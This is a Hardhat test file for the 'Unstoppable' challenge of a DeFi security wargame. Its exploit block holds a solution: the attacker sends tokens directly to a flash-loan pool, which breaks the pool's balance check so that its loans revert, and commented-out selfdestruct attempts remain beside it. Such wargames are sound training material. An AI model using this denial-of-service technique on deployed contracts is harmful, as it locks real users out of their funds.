const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        const abi = [
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function transfer(address recipient, uint256 amount) public returns (bool)"
        ]
        const Dabi = [
            "function selfDestruct(address tokenAddress) external"
        ]
        /** CODE YOUR EXPLOIT HERE */
        // const Destruct = await ethers.getContractFactory('SelfDestruct', attacker.address);
        // const destruct = await Destruct.deploy(this.pool.address);
        const token = new ethers.Contract(this.token.address, abi, attacker);
        await token.transfer(this.pool.address, 50);
        // const destruction = new ethers.Contract(destruct.address, Dabi, attacker);
        // await token.approve(destruct.address, 5)
        // console.log("here");
        // await token.transfer(destruct.address, 5);  
        // const Dbalance = await this.token.balanceOf(destruct.address);
        // const Abalance = await this.token.balanceOf(attacker.address);
        // console.log("D balance: ", ethers.utils.formatEther(Dbalance), "A balance: ", ethers.utils.formatEther(Abalance));
        // await this.token.transferFrom(attacker, this.receiverContract.address, 100);
        // const PbalanceBefore = await this.token.balanceOf(this.pool.address);
        // await destruct.selfDestruct(this.pool.address);
        // const Pbalanceafter = await this.token.balanceOf(this.pool.address);
        // console.log("before: ", ethers.utils.formatEther(PbalanceBefore), "after: ", ethers.utils.formatEther(Pbalanceafter));

        // const Attacker = await ethers.getContractFactory('ReceiverUnstoppable', attacker);
        // this.attackerContract = await Attacker.deploy(this.pool.address);
        // await this.attackerContract.executeFlashLoan(50)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
